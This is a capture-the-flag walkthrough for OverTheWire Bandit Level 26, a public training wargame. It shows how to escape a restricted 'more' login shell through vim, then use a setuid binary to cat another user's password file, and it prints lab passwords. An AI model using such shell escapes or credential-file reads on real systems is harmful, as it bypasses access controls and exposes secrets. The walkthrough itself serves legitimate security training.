# OverTheWire Bandit CTF – Level 26

## 🏆 **Goal**  
The goal of Bandit Level 26 is to break out of the restricted shell and execute a setuid binary to retrieve the password for **bandit27**.

---

## 🚀 **Steps to Solve**

### 1. **Connect via SSH**  
Use the password obtained from Level 25 to log into **bandit26** using SSH:

```bash
ssh bandit26@bandit.labs.overthewire.org -p 2220
```

- **Username:** bandit26  
- **Hostname:** bandit.labs.overthewire.org  
- **Port:** 2220  

When prompted, enter the password from Level 25:

```
s0773xxkk0MXfdqOfPRVr9L3jJBUOgCZ
```

---

### 2. **Bypass the Restricted Shell**  
After logging in, you will face the same restricted shell (`/usr/bin/showtext`) that runs the `more` command.

1. **Press** `v` – this will open the file in **vim**.  
2. Inside vim, change the shell to `/bin/bash`:

```bash
:set shell=/bin/bash
```

3. Launch the shell from vim:

```bash
:shell
```

---

### 3. **Confirm Shell Access**  
Check if you have shell access:

```bash
whoami
```

Example output:
```
bandit26
```

---

### 4. **Explore Files**  
List the files in the home directory:

```bash
ls -la
```

Output:
```
-rwsr-x--- 1 bandit27 bandit26 7302 Mar 30  2021 bandit27-do
```

The `bandit27-do` file is a **setuid binary** owned by bandit27. It allows you to execute commands as **bandit27**.

---

### 5. **Execute the Setuid Binary**  
Run the setuid binary to read the password for **bandit27**:

```bash
./bandit27-do cat /etc/bandit_pass/bandit27
```

Example output:
```
upsNCc7vzaRDx6oZC6GiR6ERwe1MowGB
```

---

## 🔑 **Password for Next Level**  
The password for **Level 27** is:

```
upsNCc7vzaRDx6oZC6GiR6ERwe1MowGB
```

---

## ✅ **Summary**  
✔️ Bypassed the restricted shell using vim.  
✔️ Gained shell access.  
✔️ Leveraged the setuid binary to retrieve the next password.  

---

## 📸 **Screenshot**  
![Level-26](https://github.com/user-attachments/assets/53379e0d-21a1-44fd-a312-f77fe3151d58)<br/>
![Level-26](https://github.com/user-attachments/assets/a079a8d5-f96f-478e-8ce2-127417b4ead0)
![Level-26](https://github.com/user-attachments/assets/5365c4cc-6ed8-4048-9434-585f6c4d802e)

---

**Next Step:** Proceed to [Level 27](https://overthewire.org/wargames/bandit/bandit27.html) to continue the challenge.  

---
